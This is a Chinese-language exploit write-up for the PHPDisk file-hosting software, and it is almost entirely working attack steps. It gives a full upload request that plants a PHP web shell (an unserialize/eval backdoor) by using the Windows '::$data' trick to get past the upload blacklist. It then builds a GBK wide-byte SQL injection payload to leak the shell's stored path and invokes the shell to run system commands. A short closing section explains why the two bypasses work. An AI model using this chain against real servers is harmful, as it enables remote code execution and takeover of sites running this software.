# phpdisk sql注入(gbk)&前台getshell（win&gbk）

## 判断系统与版本

```
http://test.test.com/AjaX.php  

http://test.test.com/  gbk
```

## ::data上传

```
POST /mydisk.php?item=upload&is_public=0&cate_id=0&subcate_id=0&folder_node=0&folder_id=-1&uid=1 HTTP/1.1
Accept: text/*
Content-Type: multipart/form-data; boundary=----------cH2gL6Ij5ei4ei4cH2gL6Ij5ae0GI3
User-Agent: Shockwave Flash
Host: test.test.com
Content-Length: 906
Proxy-Connection: Keep-Alive
Pragma: no-cache


------------cH2gL6Ij5ei4ei4cH2gL6Ij5ae0GI3
Content-Disposition: form-data; name="Filename"

shell.jpg
------------cH2gL6Ij5ei4ei4cH2gL6Ij5ae0GI3
Content-Disposition: form-data; name="desc11"

desc112
------------cH2gL6Ij5ei4ei4cH2gL6Ij5ae0GI3
Content-Disposition: form-data; name="task"

doupload
------------cH2gL6Ij5ei4ei4cH2gL6Ij5ae0GI3
Content-Disposition: form-data; name="file_id"

0
------------cH2gL6Ij5ei4ei4cH2gL6Ij5ae0GI3
Content-Disposition: form-data; name="upload_file"; filename="shell.php::$data"
Content-Type: application/octet-stream


<?php
class foo{
    public $data;
    function __destruct()
    {
        eval($this->data);
    }
}
$file_name=$_GET['id'];
unserialize($file_name);
?>
------------cH2gL6Ij5ei4ei4cH2gL6Ij5ae0GI3
Content-Disposition: form-data; name="Upload"

Submit Query
------------cH2gL6Ij5ei4ei4cH2gL6Ij5ae0GI3--

```


## 注入获取路径

```
<?php
echo base64_encode(serialize(array("file_id"=>"2333","file_name"=>"錦',`in_share`=1,`file_description`=(select x.a from (select concat(file_store_path,file_real_name)a from pd_files where file_name=0x7368656c6c)x)#")))

//YToyOntzOjc6ImZpbGVfaWQiO3M6NDoiMjMzMyI7czo5OiJmaWxlX25hbWUiO3M6MTQ4OiLpjKYnLGBpbl9zaGFyZWA9MSxgZmlsZV9kZXNjcmlwdGlvbmA9KHNlbGVjdCB4LmEgZnJvbSAoc2VsZWN0IGNvbmNhdChmaWxlX3N0b3JlX3BhdGgsZmlsZV9yZWFsX25hbWUpYSBmcm9tIHBkX2ZpbGVzIHdoZXJlIGZpbGVfbmFtZT0weDczNjg2NTZjNmMpeCkjIjt9
?>

```


```

http://test.test.com/ajax.php?action=uploadCloud

data=YToyOntzOjc6ImZpbGVfaWQiO3M6NDoiMjMzMyI7czo5OiJmaWxlX25hbWUiO3M6MTQ4OiLpjKYnLGBpbl9zaGFyZWA9MSxgZmlsZV9kZXNjcmlwdGlvbmA9KHNlbGVjdCB4LmEgZnJvbSAoc2VsZWN0IGNvbmNhdChmaWxlX3N0b3JlX3BhdGgsZmlsZV9yZWFsX25hbWUpYSBmcm9tIHBkX2ZpbGVzIHdoZXJlIGZpbGVfbmFtZT0weDczNjg2NTZjNmMpeCkjIjt9
```

## getshell

```
http://test.test.com/viewfile.php?file_id=2333

2019/08/08/ca14aabe6bc8a343df6d596070568e1a


http://test.test.com/filestores/2019/08/08/ca14aabe6bc8a343df6d596070568e1a.php?id=O:3:%22foo%22:1:{s:4:%22data%22;s:17:%22system(%27whoami%27);%22;}
```

## 总结

本次漏洞有两个有趣的点：
1.windwos下文件上传黑名单策略的::$data绕过
2.utf转gbk情形下的sql宽字节注入：“錦”这个字，它的utf-8编码是0xe98ca6，它的gbk编码是0xe55c而后面的'被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。

## refer


()[https://xz.aliyun.com/t/5594]
()[https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html]